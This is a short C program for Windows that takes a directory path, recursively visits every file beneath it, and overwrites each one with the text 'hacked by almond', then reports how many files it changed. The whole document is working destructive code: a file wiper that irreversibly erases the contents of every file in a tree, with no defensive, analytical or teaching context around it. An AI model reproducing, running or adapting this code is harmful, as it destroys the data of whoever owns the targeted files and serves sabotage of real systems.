#include <stdio.h>
#include <string.h> 
#include <io.h> 
#include <time.h>
#include <stdlib.h>
#include <conio.h>

typedef struct _finddata_t  FILE_SEARCH;

void getFileList(char *path);
int isFileOrDir(char *s);

int fileCnt = 0;

int main() {

	char path[1024];

	scanf("%s", path);
	getFileList(path);
	printf("%d files have been changed\n", fileCnt);
	printf("finished\n");
	getch();

	return 0;
}

void getFileList(char* path){

	long h_file;
	char search_Path[100];
	char filePath[1024];
	char newFilePath[1024];

	FILE_SEARCH file_search;

	sprintf_s(search_Path, "%s/*.*", path);

	if ((h_file = _findfirst(search_Path, &file_search)) == -1L) {
		printf("No files in current directory!\n");

	}

	else {

		do {

			if (strcmp(file_search.name, ".") != 0 && strcmp(file_search.name, "..") != 0) {
				sprintf(filePath, "%s%s", path, file_search.name);

				if ((isFileOrDir(filePath) == 1) && (strstr(filePath, "..") == NULL)) {
					FILE *w;

					w = fopen(filePath, "w");

					fprintf(w, "hacked by almond\n");
					fclose(w);
					fileCnt++;
				}

				else if ((isFileOrDir(filePath) == 0) && (strstr(filePath, "..") == NULL)) {
					strcpy(newFilePath, filePath);
					strcat(newFilePath, "\\");
					getFileList(newFilePath);
				}

			}

		} while (_findnext(h_file, &file_search) == 0);

		_findclose(h_file);
	}
}

int isFileOrDir(char* s) {

	FILE_SEARCH c_file;
	intptr_t hFile;
	int result;

	if ((hFile = _findfirst(s, &c_file)) == -1L)
		result = -1;

	else {

		if (c_file.attrib & _A_SUBDIR)
			result = 0;

		else
			result = 1;

	}

	_findclose(hFile);

	return result;
}